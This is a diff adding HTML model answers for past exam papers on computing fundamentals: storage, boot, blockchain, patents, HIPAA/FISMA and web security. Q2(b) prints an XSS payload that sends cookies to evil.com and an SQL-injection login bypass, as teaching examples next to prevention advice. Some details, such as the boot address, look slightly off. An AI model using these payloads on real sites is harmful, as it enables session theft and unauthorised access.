+        <div class="sub-question">Supervised Learning vs Unsupervised Learning.</div>
+        <div class="answer">
+          <h4>Supervised vs Unsupervised Learning</h4>
+          <table class="ans-table">
+            <tr><th></th><th>Supervised Learning</th><th>Unsupervised Learning</th></tr>
+            <tr><td><strong>Data</strong></td><td>"Labeled" dataset — input paired with correct output (ground truth)</td><td>Unlabeled data — no predefined correct output</td></tr>
+            <tr><td><strong>Goal</strong></td><td>Learn to map inputs to outputs by minimizing prediction error</td><td>Discover hidden structures, patterns, or groupings in raw data</td></tr>
+            <tr><td><strong>Use Cases</strong></td><td><mark>Classification</mark> (spam detection) and <mark>Regression</mark> (stock price prediction)</td><td><mark>Clustering</mark> (customer segmentation) and <mark>Association</mark> (market basket analysis)</td></tr>
+            <tr><td><strong>Example</strong></td><td>Identifying whether an email is spam using labeled spam/non-spam training data</td><td>Grouping customers by similar buying habits without predefined categories</td></tr>
+          </table>
+        </div>
+      </div>
+
+      <!-- 3c i -->
+      <div class="sub-q">
+        <div class="sub-label">Q3(c)(i)</div>
+        <div class="sub-question">Computer Vision tasks: Image Classification, Object Detection, Segmentation.</div>
+        <div class="answer">
+          <h4>Computer Vision Tasks</h4>
+          <table class="ans-table">
+            <tr><th>Task</th><th>Objective</th><th>Output</th><th>Application</th></tr>
+            <tr>
+              <td><strong>Image Classification</strong></td>
+              <td>Assigns a single categorical label to an entire image. Identifies <mark>"what"</mark> is in the image without locating it.</td>
+              <td>A single text label (e.g., "Pneumonia" or "Car") with confidence score</td>
+              <td>Medical X-ray screening, automated photo tagging in e-commerce</td>
+            </tr>
+            <tr>
+              <td><strong>Object Detection</strong></td>
+              <td>Identifies <mark>"what"</mark> and <mark>"where"</mark> for multiple objects within a single image</td>
+              <td>Bounding boxes labeled with class names and confidence percentages</td>
+              <td>Autonomous vehicles detecting pedestrians/cars, security systems spotting unauthorized bags</td>
+            </tr>
+            <tr>
+              <td><strong>Semantic &amp; Instance Segmentation</strong></td>
+              <td>Pixel-level mapping of exact shape and boundary of objects. Semantic groups all category pixels; Instance distinguishes individual objects of the same category</td>
+              <td>A pixel-mask (colored overlay) showing the precise silhouette of every detected entity</td>
+              <td>Robotic surgery for precise tumor removal, defining "driveable space" for self-driving cars</td>
+            </tr>
+          </table>
+        </div>
+      </div>
+
+      <!-- 3c ii -->
+      <div class="sub-q">
+        <div class="sub-label">Q3(c)(ii)</div>
+        <div class="sub-question">What is Human-Computer Interaction (HCI)?</div>
+        <div class="answer">
+          <h4>Human-Computer Interaction (HCI)</h4>
+          <p><strong>HCI</strong> is a multidisciplinary field focused on the design of computer technology and the interaction between humans (users) and computers. It combines <mark>computer science, cognitive psychology, and design</mark> to ensure that systems are usable, efficient, and accessible.</p>
+          <p>The goal is to minimize the "barrier" between a human's mental model of a task and the computer's execution of it — creating interfaces that feel natural, intuitive, and error-resistant.</p>
+          <div class="info-box tip"><strong>Core Disciplines in HCI</strong>Computer Science (what's technically feasible) + Cognitive Psychology (how humans think and perceive) + Design (how to make it usable and beautiful) = systems that people actually want to use.</div>
+        </div>
+      </div>
+
+    </div>
+  </div>
+
+</div><!-- end B20 -->
+
+
+<!-- ═══════════════════════════════════════════ B21 ═══════════════════════════════════════════ -->
+<div class="year-section active" id="b21">
+
+  <div class="paper-header">
+    <div class="paper-info">
+      <h2>Winter Semester 2021–2022</h2>
+      <div class="semester">13 December 2022 · Duration: 3 Hours · Full Marks: 150 · Answer ALL 6 Questions</div>
+    </div>
+    <div class="paper-badges">
+      <span class="badge badge-gold">150 Marks</span>
+      <span class="badge badge-teal">6 Questions</span>
+    </div>
+  </div>
+
+  <!-- Q1 -->
+  <div class="q-block">
+    <div class="q-header open" onclick="toggleQ(this)">
+      <div class="q-num">Q1</div>
+      <div class="q-title">File System Conceptual Model, Computer Boot, Linux Commands &amp; Storage</div>
+      <div class="q-marks">7 + 8 + 10 + 10 + 5 = 40 Marks</div>
+      <div class="q-arrow">▼</div>
+    </div>
+    <div class="q-body open">
+
+      <!-- 1a -->
+      <div class="sub-q">
+        <div class="sub-label">Q1(a) · 7 Marks</div>
+        <div class="sub-question">Describe a conceptual file system that achieves the typical storage cataloging purpose – 'Directory contains Directories and Files, File comprises of few storage block(s)'.</div>
+        <div class="answer">
+          <h4>Conceptual File System Model</h4>
+          <p>A file system organizes stored data into a hierarchical structure. At the top is the <mark>root directory</mark>, which contains sub-directories and files. Each <strong>Directory</strong> is a special file that holds references (pointers) to other directories or files — enabling a tree structure.</p>
+          <div class="diagram">
+            <div class="box">Root /</div>
+            <br>
+            <span style="color:var(--muted)">↙ &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ↘</span><br>
+            <div class="box">Directory /home</div>
+            <div class="box">Directory /etc</div>
+            <br>
+            <span style="color:var(--muted)">↓</span><br>
+            <div class="box">File: resume.txt</div>
+            <br>
+            <span style="color:var(--muted); font-size:11px">File → [Block 1] [Block 2] [Block 3] on Disk</span>
+          </div>
+          <p>A <strong>File</strong> is an abstraction for stored data, made up of one or more <mark>storage blocks</mark> on disk. The file system maintains an <strong>inode</strong> (index node) per file, storing metadata: size, permissions, owner, and pointers to data blocks.</p>
+          <div class="info-box key"><strong>Key Points</strong>Directories act as containers; Files are data units; Data blocks are fixed-size disk segments (e.g., 4KB in ext4); The OS uses inode tables to locate file blocks quickly.</div>
+        </div>
+      </div>
+
+      <!-- 1b -->
+      <div class="sub-q">
+        <div class="sub-label">Q1(b) · 8 Marks</div>
+        <div class="sub-question">How does a computer boot up?</div>
+        <div class="answer">
+          <h4>Computer Boot Process</h4>
+          <ul class="ans-list">
+            <li><strong>Power ON:</strong> Electricity flows to motherboard; CPU starts at a fixed address (FFFF:0000h).</li>
+            <li><strong>POST (Power-On Self Test):</strong> BIOS/UEFI firmware checks RAM, CPU, keyboard, and storage hardware for faults.</li>
+            <li><strong>BIOS/UEFI:</strong> Reads the boot device order (HDD, SSD, USB). Loads the <mark>Master Boot Record (MBR)</mark> or <mark>EFI partition</mark> into RAM.</li>
+            <li><strong>Bootloader (GRUB/Windows Boot Manager):</strong> Small program that locates the OS kernel on disk and loads it into memory.</li>
+            <li><strong>Kernel Loads:</strong> OS kernel initializes drivers, mounts the root filesystem, and starts system services (init/systemd).</li>
+            <li><strong>User Space:</strong> Login prompt or desktop environment appears.</li>
+          </ul>
+          <div class="info-box tip"><strong>Exam Tip</strong>BIOS = Basic Input Output System (legacy); UEFI = Unified Extensible Firmware Interface (modern). MBR holds the bootloader in the first 512 bytes of disk.</div>
+        </div>
+      </div>
+
+      <!-- 1c -->
+      <div class="sub-q">
+        <div class="sub-label">Q1(c) · i. 3 Marks + ii. 2 Marks + iii. 5 Marks</div>
+        <div class="sub-question">A novice user ran <code>ls</code> and <code>cd myfileDirDev</code> but got 'Error: not a directory'. (i) What mistake? (ii) Output of <code>ls -l</code>? (iii) Program to count files and directories.</div>
+        <div class="answer">
+          <h4>(i) The Mistake</h4>
+          <p><mark>myfileDirDev is a FILE, not a directory.</mark> The <code>ls</code> output shows it alongside regular files without a trailing <code>/</code>. The user tried to <code>cd</code> into a file, which is not possible.</p>
+
+          <h4>(ii) Output of <code>ls -l</code></h4>
+          <div class="code-block">-rw-r--r-- 1 root root  4096 Dec 10 10:22 myfileDirDev
+drwxr-xr-x 2 root root  4096 Dec 10 09:15 home</div>
+          <p>The first character <code>-</code> means regular file; <code>d</code> means directory. This confirms <code>myfileDirDev</code> is a plain file.</p>
+
+          <h4>(iii) Program to Count Files and Directories</h4>
+<div class="code-block"><span class="comment"># Algorithm: read ls -l output, count files (starts with -) and dirs (starts with d)</span>
+<span class="keyword">import</span> subprocess
+
+<span class="keyword">def</span> count_files_dirs():
+    fileCount = 0
+    dirCount  = 0
+    output = subprocess.getoutput(<span class="string">"ls -l /home"</span>)
+    lines  = output.split(<span class="string">'\n'</span>)
+    <span class="keyword">for</span> line <span class="keyword">in</span> lines:
+        <span class="keyword">if</span> line.startswith(<span class="string">'-'</span>):
+            fileCount += <span class="num">1</span>
+        <span class="keyword">elif</span> line.startswith(<span class="string">'d'</span>):
+            dirCount += <span class="num">1</span>
+    print(<span class="string">f"Files: {fileCount}, Directories: {dirCount}"</span>)
+
+count_files_dirs()</div>
+          <div class="info-box note"><strong>Algorithm Logic</strong>Each line of <code>ls -l</code> starts with a permission string. '-' = regular file; 'd' = directory; 'l' = symlink. Simply iterate lines and count based on the first character.</div>
+        </div>
+      </div>
+
+      <!-- 1d -->
+      <div class="sub-q">
+        <div class="sub-label">Q1(d) · 10 Marks</div>
+        <div class="sub-question">Describe Hard Disk and its storage mechanism.</div>
+        <div class="answer">
+          <h4>Hard Disk Drive (HDD) — Storage Mechanism</h4>
+          <p>A Hard Disk Drive stores data magnetically on spinning <strong>platters</strong> coated with a ferromagnetic material. Key components:</p>
+          <ul class="ans-list">
+            <li><strong>Platters:</strong> Circular disks (1-5 per drive) spinning at 5400–7200 RPM.</li>
+            <li><strong>Read/Write Head:</strong> Hovers nanometers above platter; magnetizes bits as 0/1.</li>
+            <li><strong>Spindle Motor:</strong> Rotates platters at constant speed.</li>
+            <li><strong>Actuator Arm:</strong> Moves heads to correct track position.</li>
+          </ul>
+          <h4>Data Organization</h4>
+          <ul class="ans-list">
+            <li><strong>Track:</strong> Concentric circular path on platter.</li>
+            <li><strong>Sector:</strong> Smallest addressable unit (512 bytes or 4KB).</li>
+            <li><strong>Cylinder:</strong> Same track number across all platters.</li>
+            <li><strong>Cluster:</strong> Group of sectors allocated by OS for one file.</li>
+          </ul>
+          <div class="info-box tip"><strong>Access Time = Seek Time + Rotational Latency + Transfer Time</strong>Seek Time: moving head to correct track. Rotational Latency: waiting for sector to spin under head. Transfer Time: reading actual data.</div>
+        </div>
+      </div>
+
+      <!-- 1e -->
+      <div class="sub-q">
+        <div class="sub-label">Q1(e) · 10 Marks</div>
+        <div class="sub-question">Describe Flash storage technology. How do size and access time vary based on NAND and NOR packaging?</div>
+        <div class="answer">
+          <h4>Flash Storage Technology</h4>
+          <p>Flash memory stores data in <strong>floating-gate transistors</strong> that trap electrons to represent 0/1. Unlike RAM, it is <mark>non-volatile</mark> (retains data without power). Data is written in <strong>pages</strong> (4KB) and erased in <strong>blocks</strong> (hundreds of pages).</p>
+          <table class="ans-table">
+            <tr><th>Feature</th><th>NAND Flash</th><th>NOR Flash</th></tr>
+            <tr><td>Connection</td><td>Gates in series (NAND logic)</td><td>Gates in parallel (NOR logic)</td></tr>
+            <tr><td>Cell Density / Size</td><td>Higher density → smaller, cheaper</td><td>Lower density → larger, costlier</td></tr>
+            <tr><td>Read Speed</td><td>Slower sequential read</td><td>Faster random read (byte-addressable)</td></tr>
+            <tr><td>Write/Erase Speed</td><td>Faster write/erase</td><td>Slower write/erase</td></tr>
+            <tr><td>Use Case</td><td>SSDs, USB drives, memory cards</td><td>BIOS/firmware chips, embedded systems</td></tr>
+          </table>
+          <div class="info-box key"><strong>Key Rule</strong>NAND = storage; NOR = execution. NOR allows code execution in-place (XIP); NAND must load code to RAM first.</div>
+        </div>
+      </div>
+
+      <!-- 1f short -->
+      <div class="sub-q">
+        <div class="sub-label">Q1(f) · 1×5 = 5 Marks (Short Questions)</div>
+        <div class="sub-question">i. Why Cache? ii. Bits in a kilobyte? iii. Why not Flash as RAM? iv. Why hard to make >1GB CPU chip? v. Computer system components?</div>
+        <div class="answer">
+          <ul class="ans-list">
+            <li><strong>i. Cache Memory:</strong> CPU is much faster than RAM. Cache stores frequently accessed data near CPU to reduce latency (L1 ~1ns vs RAM ~100ns).</li>
+            <li><strong>ii. Kilo Byte:</strong> 1 KB = 1024 bytes = <mark>8192 bits</mark>.</li>
+            <li><strong>iii. Flash not RAM:</strong> Flash has slow write speed, limited erase cycles (~100K), and high latency — unsuitable for rapid CPU read/write operations.</li>
+            <li><strong>iv. >1GB CPU chip:</strong> Heat dissipation, power consumption, and manufacturing yield drop drastically with larger chips. Transistor density limits and quantum effects make it impractical.</li>
+            <li><strong>v. Computer Components:</strong> CPU, RAM, Storage (HDD/SSD), Motherboard, PSU (Power Supply), I/O devices (keyboard, monitor), GPU, Network Card.</li>
+          </ul>
+        </div>
+      </div>
+
+    </div>
+  </div>
+
+  <!-- Q2 -->
+  <div class="q-block">
+    <div class="q-header" onclick="toggleQ(this)">
+      <div class="q-num">Q2</div>
+      <div class="q-title">Phishing, XSS, SQL Injection, Viruses in Executables &amp; IAT/ELF</div>
+      <div class="q-marks">7 + 8 + 10 = 25 Marks</div>
+      <div class="q-arrow">▼</div>
+    </div>
+    <div class="q-body">
+
+      <div class="sub-q">
+        <div class="sub-label">Q2(a) · 7 Marks</div>
+        <div class="sub-question">Describe two phishing attack scenarios.</div>
+        <div class="answer">
+          <h4>Phishing Attack Scenarios</h4>
+          <p><strong>Scenario 1 — Email Phishing (Fake Bank):</strong> Attacker sends an email impersonating "Bangladesh Bank" saying "Your account has been locked. Click here to verify." The link leads to <code>bangladeshbank-secure.xyz</code> (look-alike domain). The victim enters credentials, which are captured. Attacker gains full account access.</p>
+          <p><strong>Scenario 2 — Spear Phishing (Targeted):</strong> Attacker researches a company employee on LinkedIn, crafts an email pretending to be their CEO: "Hi [Name], urgent — please transfer $5,000 to this vendor account before EOD." Because it's personalized with real names and context, the victim complies. This is called <mark>Business Email Compromise (BEC)</mark>.</p>
+          <div class="info-box tip"><strong>Prevention</strong>Multi-Factor Authentication (MFA); verify sender addresses manually; anti-phishing browser extensions; DMARC/SPF/DKIM email authentication; employee security training.</div>
+        </div>
+      </div>
+
+      <div class="sub-q">
+        <div class="sub-label">Q2(b) · 8 Marks</div>
+        <div class="sub-question">Describe XSS Attack and SQL Injection. How can those attacks be prevented?</div>
+        <div class="answer">
+          <h4>XSS (Cross-Site Scripting)</h4>
+          <p>Attacker injects malicious JavaScript into a web page. When other users view that page, the script executes in their browser — stealing cookies or redirecting.</p>
+          <div class="code-block"><span class="comment">// Malicious input in a comment form:</span>
+&lt;script&gt;document.location=<span class="string">'http://evil.com?c='</span>+document.cookie&lt;/script&gt;</div>
+          <p><strong>Prevention:</strong> HTML encode output (<code>&lt;</code> → <code>&amp;lt;</code>); use Content Security Policy (CSP); HttpOnly cookies; sanitize all user input.</p>
+
+          <h4>SQL Injection</h4>
+          <p>Attacker inserts SQL code into an input field that gets executed by the database.</p>
+          <div class="code-block"><span class="comment">// Vulnerable login query:</span>
+SELECT * FROM users WHERE user=<span class="string">'admin'</span> AND pass=<span class="string">'' OR '1'='1'</span>
+<span class="comment">// '1'='1' is always true → bypasses authentication!</span></div>
+          <p><strong>Prevention:</strong> <mark>Parameterized Queries / Prepared Statements</mark> (most effective); ORMs; input validation; Web Application Firewall (WAF); least-privilege database accounts.</p>
+        </div>
+      </div>
+
+      <div class="sub-q">
+        <div class="sub-label">Q2(c) · 10 Marks</div>
+        <div class="sub-question">Describe Virus and their way of propagation in executables. Describe IAT and ELF (Entry Point) Virus.</div>
+        <div class="answer">
+          <h4>Virus Propagation in Executables</h4>
+          <p>A virus attaches itself to a host executable and runs its malicious code when the host is executed. Propagation methods:</p>
+          <ul class="ans-list">
+            <li><strong>Code Cave Injection:</strong> Unused padding space in PE sections is filled with virus code.</li>
+            <li><strong>Section Appending:</strong> A new malicious section is added to the PE file.</li>
+            <li><strong>File Infection:</strong> Virus scans for other .exe files on disk and infects them similarly.</li>
+          </ul>
+          <h4>Entry Point (EP) Virus</h4>
+          <p>The virus modifies the <strong>AddressOfEntryPoint</strong> field in the PE Optional Header to point to the virus code. When the executable launches, virus code runs first, then jumps back (<code>JMP</code>) to the original entry point. This is called <mark>EPO (Entry Point Obscuring)</mark>.</p>
+          <div class="diagram">
+            <span class="box">Original Entry Point</span>
+            <span class="arrow">→ hijacked to →</span>
+            <span class="box">Virus Code</span>
+            <span class="arrow">→ JMP →</span>
+            <span class="box">Original main()</span>
+          </div>
+          <h4>IAT (Import Address Table) Virus</h4>
+          <p>The <strong>IAT</strong> stores addresses of Windows API functions (from DLLs) that a program uses. An IAT virus replaces legitimate API addresses in the IAT with addresses of malicious functions. When the program calls <code>ReadFile()</code>, it secretly calls the virus's version instead. This is hard to detect because the file structure appears normal — only runtime behavior is altered.</p>
+          <div class="info-box warn"><strong>Why IAT Viruses Are Hard to Detect</strong>Static analysis sees the original import names. The malicious addresses are only written at runtime. Signature-based AV cannot match the dynamically substituted code.</div>
+        </div>
+      </div>
+
+    </div>
+  </div>
+
+  <!-- Q3 -->
+  <div class="q-block">
+    <div class="q-header" onclick="toggleQ(this)">
+      <div class="q-num">Q3</div>
+      <div class="q-title">Patents (Title 35 USC), IT Revenue from Patents, HIPAA &amp; FISMA</div>
+      <div class="q-marks">7 + 8 + 10 = 25 Marks</div>
+      <div class="q-arrow">▼</div>
+    </div>
+    <div class="q-body">
+
+      <div class="sub-q">
+        <div class="sub-label">Q3(a) · 7 Marks</div>
+        <div class="sub-question">Which things are patentable? Describe in light of first three sections of "Title 35 of the United States Code".</div>
+        <div class="answer">
+          <h4>Patentability — Title 35 USC</h4>
+          <table class="ans-table">
+            <tr><th>Section</th><th>Provision</th><th>Details</th></tr>
+            <tr><td>§ 101 — Subject Matter</td><td>What can be patented</td><td>Any new and useful <strong>process, machine, manufacture, or composition of matter</strong>. Software algorithms, business methods can qualify if tied to a specific technical process. Laws of nature, abstract ideas, and natural phenomena CANNOT be patented.</td></tr>
+            <tr><td>§ 102 — Novelty</td><td>Must be NEW</td><td>Invention must not have been publicly disclosed, patented, or sold anywhere in the world before the filing date. Even the inventor's own prior disclosure can bar a patent.</td></tr>
+            <tr><td>§ 103 — Non-Obviousness</td><td>Must not be obvious</td><td>Even if novel, an invention that would be obvious to a "person having ordinary skill in the art" (PHOSITA) cannot be patented. This prevents trivial combinations of existing ideas from being patented.</td></tr>
+          </table>
+          <div class="info-box key"><strong>Also Required</strong>§ 112: Adequate disclosure — the patent must fully describe the invention so others can reproduce it after the patent expires.</div>
+        </div>
+      </div>
+
+      <div class="sub-q">
+        <div class="sub-label">Q3(b) · 8 Marks</div>
+        <div class="sub-question">How do IT organizations generate revenue from patents, sometimes even from the products of other companies? Briefly provide two examples.</div>
+        <div class="answer">
+          <h4>IT Revenue from Patents</h4>
+          <p>IT companies monetize patents through: <strong>Licensing fees</strong> (charge royalties per unit sold), <strong>Cross-licensing</strong> (trade patent rights with competitors), <strong>Litigation</strong> (sue infringers for damages), and <strong>Patent Trolling</strong> (holding patents only to sue others, without making products — via NPEs: Non-Practicing Entities).</p>
+          <h4>Examples</h4>
+          <p><strong>Example 1 — Microsoft &amp; Android:</strong> Microsoft holds patents on FAT file system and certain Linux/Android technologies. Microsoft earns ~$5–15 per Android device sold by Samsung, HTC, and others — generating billions without making Android phones themselves.</p>
+          <p><strong>Example 2 — Qualcomm FRAND Licensing:</strong> Qualcomm holds essential 3G/4G/5G wireless standard patents. They license these to Apple, Samsung, and other phone makers at a percentage of device cost (FRAND — Fair, Reasonable, Non-Discriminatory terms). This generates over $5B annually in licensing revenue.</p>
+        </div>
+      </div>
+
+      <div class="sub-q">
+        <div class="sub-label">Q3(c) · 10 Marks</div>
+        <div class="sub-question">Describe HIPAA and FISMA for Information and Cyber Security.</div>
+        <div class="answer">
+          <h4>HIPAA (Health Insurance Portability and Accountability Act, 1996)</h4>
+          <ul class="ans-list">
+            <li><strong>Purpose:</strong> Protects patients' <mark>PHI (Protected Health Information)</mark> — medical records, billing, test results.</li>
+            <li><strong>Privacy Rule:</strong> Limits who can access PHI; requires patient consent for disclosure.</li>
+            <li><strong>Security Rule:</strong> Requires technical (encryption, access control), physical (locked servers), and administrative safeguards for ePHI.</li>
+            <li><strong>Breach Rule:</strong> Notify affected individuals within 60 days of a data breach.</li>
+            <li><strong>Penalties:</strong> $100 to $1.9 million per violation category per year.</li>
+            <li><strong>Applies to:</strong> Hospitals, clinics, health insurers, and their business associates.</li>
+          </ul>
+          <h4>FISMA (Federal Information Security Management Act, 2002)</h4>
+          <ul class="ans-list">
+            <li><strong>Purpose:</strong> Requires US federal agencies to develop and maintain information security programs.</li>
+            <li><strong>FIPS 199:</strong> Categorize information systems as Low, Moderate, or High impact.</li>
+            <li><strong>NIST SP 800-53:</strong> Mandated security controls for federal systems.</li>
+            <li><strong>Continuous Monitoring:</strong> Ongoing assessment of security controls.</li>
+            <li><strong>CISO Requirement:</strong> Each agency must appoint a Chief Information Security Officer.</li>
+            <li><strong>Applies to:</strong> All federal agencies + contractors handling federal data.</li>
+          </ul>
+          <div class="info-box note"><strong>HIPAA vs FISMA</strong>HIPAA = healthcare data protection (private + public sector). FISMA = federal government IT security framework. Both require risk assessment, access control, and incident response plans.</div>
+        </div>
+      </div>
+
+    </div>
+  </div>
+
+  <!-- Q4 -->
+  <div class="q-block">
+    <div class="q-header" onclick="toggleQ(this)">
+      <div class="q-num">Q4</div>
+      <div class="q-title">Software Development Process, Compiler/Assembler/Linker, Web Security, AJAX &amp; URL</div>
+      <div class="q-marks">5 + 10 + 10 = 25 Marks</div>
+      <div class="q-arrow">▼</div>
+    </div>
+    <div class="q-body">
+
+      <div class="sub-q">
+        <div class="sub-label">Q4(a) · 5 Marks</div>
+        <div class="sub-question">Tour analogy to software development process — similarities?</div>
+        <div class="answer">
+          <h4>Tour vs Software Development Analogy</h4>
+          <table class="ans-table">
+            <tr><th>Tour Activity</th><th>Software Development Equivalent</th></tr>
+            <tr><td>Planning the route / destination</td><td>Requirements Analysis &amp; Planning</td></tr>
+            <tr><td>Packing / preparing</td><td>System Design &amp; Architecture</td></tr>
+            <tr><td>Traveling / executing the tour</td><td>Implementation / Coding</td></tr>
+            <tr><td>Checking if plan was followed</td><td>Testing &amp; QA</td></tr>
+            <tr><td>Improving on repeat tours</td><td>Iterative Development / Agile Sprints</td></tr>
+            <tr><td>Tour guide / team leader</td><td>Project Manager</td></tr>
+          </table>
+          <p>Just as repetitive tours improve efficiency (you know the shortcuts), repetitive software iterations improve code quality and team productivity — forming the basis of <mark>Agile/Iterative Development</mark>.</p>
+        </div>
+      </div>
+
+      <div class="sub-q">
+        <div class="sub-label">Q4(b) · 10 Marks</div>
+        <div class="sub-question">Describe the tasks of compiler, assembler, and linker in producing a binary.</div>
+        <div class="answer">
+          <h4>From Source Code to Executable</h4>
+          <div class="diagram">
+            <span class="box">Source Code (.c)</span>
+            <span class="arrow">→ Compiler →</span>
+            <span class="box">Assembly (.asm)</span>
+            <span class="arrow">→ Assembler →</span>
+            <span class="box">Object File (.o)</span>
+            <span class="arrow">→ Linker →</span>
+            <span class="box">Executable (.exe)</span>
+          </div>
+          <ul class="ans-list">
+            <li><strong>Compiler:</strong> Translates high-level source code (C, C++) into assembly language. Performs lexical analysis, parsing, semantic analysis, optimization, and code generation. Detects syntax/type errors.</li>
+            <li><strong>Assembler:</strong> Converts assembly code into <mark>machine code (object files)</mark>. Each assembly instruction maps to a binary opcode. Produces a relocatable object file (.o/.obj) with symbol tables.</li>
+            <li><strong>Linker:</strong> Combines multiple object files and libraries into one final executable. Resolves <strong>external references</strong> (e.g., printf from libc), performs <strong>relocation</strong> (assigns final memory addresses), and produces the PE/ELF binary.</li>
+          </ul>
+          <div class="info-box tip"><strong>Static vs Dynamic Linking</strong>Static linker copies library code into the executable (larger file, no dependency). Dynamic linker resolves library addresses at runtime using DLLs/.so files (smaller file, requires libraries installed).</div>
+        </div>
+      </div>
+
+      <div class="sub-q">
+        <div class="sub-label">Q4(c) · 2×5 = 10 Marks (Short Questions)</div>
+        <div class="sub-question">i. AJAX and XSS vulnerability. ii. Quick SQL writing prone to injection. iii. Two non-WWW internet applications. iv. URL resolution by browser. v. Executable without IDE.</div>
+        <div class="answer">
+          <ul class="ans-list">
+            <li><strong>i. AJAX &amp; XSS:</strong> AJAX dynamically updates page content without full reload. Malicious scripts injected via AJAX responses bypass full-page sanitization checks and execute in the same DOM context — increasing XSS attack surface.</li>
+            <li><strong>ii. Quick SQL writing &amp; Injection:</strong> Developers who concatenate user input directly into SQL strings (e.g., <code>"SELECT * FROM users WHERE name='"+input+"'"</code>) skip parameterized queries, leaving the DB open to injection.</li>
+            <li><strong>iii. Non-WWW Internet Protocols:</strong> <mark>Email (SMTP/IMAP/POP3)</mark> and <mark>FTP (File Transfer Protocol)</mark>. Others: DNS, SSH, Telnet, MQTT.</li>
+            <li><strong>iv. URL Resolution:</strong> Browser checks cache → queries DNS server → DNS returns IP address → browser sends HTTP/HTTPS request to IP → server returns response → browser renders page.</li>
+            <li><strong>v. Executable without IDE:</strong> Yes. Use a text editor (vim/notepad) to write code, compile with <code>gcc file.c -o file</code> (GCC), and run from terminal. IDE is just a convenience wrapper around these command-line tools.</li>
+          </ul>
+        </div>
+      </div>
+
+    </div>
+  </div>
+
+  <!-- Q5 -->
+  <div class="q-block">
+    <div class="q-header" onclick="toggleQ(this)">
+      <div class="q-num">Q5</div>
+      <div class="q-title">Blockchain — Miner's Task &amp; Merkle Tree</div>
+      <div class="q-marks">7 + 8 + 10 = 25 Marks</div>
+      <div class="q-arrow">▼</div>
+    </div>
+    <div class="q-body">
+
+      <div class="sub-q">
+        <div class="sub-label">Q5(a) · 7 Marks</div>
+        <div class="sub-question">Describe the task of a miner in a blockchain.</div>
+        <div class="answer">
+          <h4>Miner's Tasks in Blockchain</h4>
+          <ul class="ans-list">
+            <li><strong>Transaction Collection:</strong> Miner collects pending transactions from the mempool (memory pool) and verifies signatures using public keys.</li>
+            <li><strong>Block Construction:</strong> Groups valid transactions into a candidate block, adding a block header with: previous block hash, timestamp, Merkle root, nonce.</li>
+            <li><strong>Proof of Work:</strong> Repeatedly hashes the block header with different nonce values until finding a hash below the <mark>target difficulty</mark> (starts with N zeros).</li>
+            <li><strong>Broadcasting:</strong> On finding a valid hash (nonce), broadcasts the block to the network.</li>
+            <li><strong>Reward:</strong> Earns block reward (newly minted Bitcoin) + transaction fees.</li>
+          </ul>
+          <div class="info-box key"><strong>Why Mining = Security</strong>To alter a past transaction, the attacker must redo PoW for that block AND all subsequent blocks faster than the honest network — computationally infeasible without 51% hash power.</div>
+        </div>
+      </div>
+
+      <div class="sub-q">
+        <div class="sub-label">Q5(b) · 8 Marks</div>
+        <div class="sub-question">What is a Merkle Tree in peer-to-peer networks? How is it used in blockchain?</div>
+        <div class="answer">
+          <h4>Merkle Tree</h4>
+          <p>A <strong>Merkle Tree</strong> is a binary hash tree where each leaf node is the hash of a transaction, and each parent node is the hash of its two child hashes. The single top hash is called the <mark>Merkle Root</mark>.</p>
+          <div class="diagram">
+            <span class="box" style="background:rgba(232,168,75,0.2);border-color:rgba(232,168,75,0.5);color:var(--gold-light)">Merkle Root</span><br>
+            <span style="color:var(--muted)">↙ &nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ↘</span><br>
+            <span class="box">Hash(AB)</span> &nbsp; <span class="box">Hash(CD)</span><br>
+            <span style="color:var(--muted)">↙↘&nbsp;&nbsp;↙↘</span><br>
+            <span class="box">Hash(A)</span><span class="box">Hash(B)</span><span class="box">Hash(C)</span><span class="box">Hash(D)</span><br>
+            <span style="font-size:11px;color:var(--muted)">TxA &nbsp;&nbsp; TxB &nbsp;&nbsp; TxC &nbsp;&nbsp; TxD</span>
+          </div>
+          <h4>Use in Blockchain</h4>
+          <ul class="ans-list">
+            <li><strong>Integrity:</strong> The Merkle Root in the block header summarizes ALL transactions. Any change to one transaction changes the root, invalidating the block.</li>
+            <li><strong>SPV (Simplified Payment Verification):</strong> Light clients can verify a transaction is in a block without downloading all transactions — only need a Merkle Proof (path from leaf to root).</li>
+            <li><strong>Efficiency:</strong> Reduces data needed for verification from O(n) to O(log n).</li>
+          </ul>
+        </div>
+      </div>
+
+      <div class="sub-q">
+        <div class="sub-label">Q5(c) · 2×5 = 10 Marks (Short Questions)</div>
+        <div class="sub-question">i. How does blockchain invalidate double spending? ii. How is PoW Byzantine fault tolerant? iii. Increased hash rate = more secure? iv. Hashing algorithm in Bitcoin? v. Simple hashing technique.</div>
+        <div class="answer">
+          <ul class="ans-list">
+            <li><strong>i. Double Spending Prevention:</strong> Once a transaction is confirmed and buried under 6+ blocks, altering it requires recomputing PoW for all subsequent blocks faster than the whole network — economically and computationally impossible.</li>
+            <li><strong>ii. PoW = BFT:</strong> Even if some miners are malicious, as long as honest miners control >50% of hash power, the longest honest chain wins. Malicious nodes cannot rewrite history without majority compute power.</li>
+            <li><strong>iii. Hash Rate = Security:</strong> Higher total hash rate means more computational work needed to mount a 51% attack. Attacker would need to match/exceed the entire honest network's power, making attacks exponentially more expensive.</li>
+            <li><strong>iv. Bitcoin Hashing:</strong> Bitcoin uses <mark>SHA-256 (Secure Hash Algorithm 256-bit)</mark>. Mining applies it twice: SHA-256(SHA-256(block_header)).</li>
+            <li><strong>v. Simple Hash:</strong> Sum of ASCII values of characters modulo a prime. e.g., hash("AB") = (65+66) % 97 = 34. Real hashes use bitwise operations, modular arithmetic, and compression functions for avalanche effect.</li>
+          </ul>
+        </div>
+      </div>
+
+    </div>
+  </div>
+
+</div><!-- end B21 -->
+
+
+<!-- ═══════════════════════════════════════════ B22 ═══════════════════════════════════════════ -->
+<div class="year-section" id="b22">
+
+  <div class="paper-header">
+    <div class="paper-info">
+      <h2>Winter Semester 2022–2023</h2>
+      <div class="semester">08 December 2023 · Duration: 3 Hours · Full Marks: 150 · Answer ALL 6 Questions</div>
+    </div>
+    <div class="paper-badges">
+      <span class="badge badge-gold">150 Marks</span>
+      <span class="badge badge-teal">6 Questions</span>
+    </div>
+  </div>
+
+  <!-- Q1 -->
+  <div class="q-block">
+    <div class="q-header open" onclick="toggleQ(this)">
+      <div class="q-num">Q1</div>
+      <div class="q-title">Algorithm (Hall Seat), LMS Features, Arithmetic Overflow, Short Questions</div>
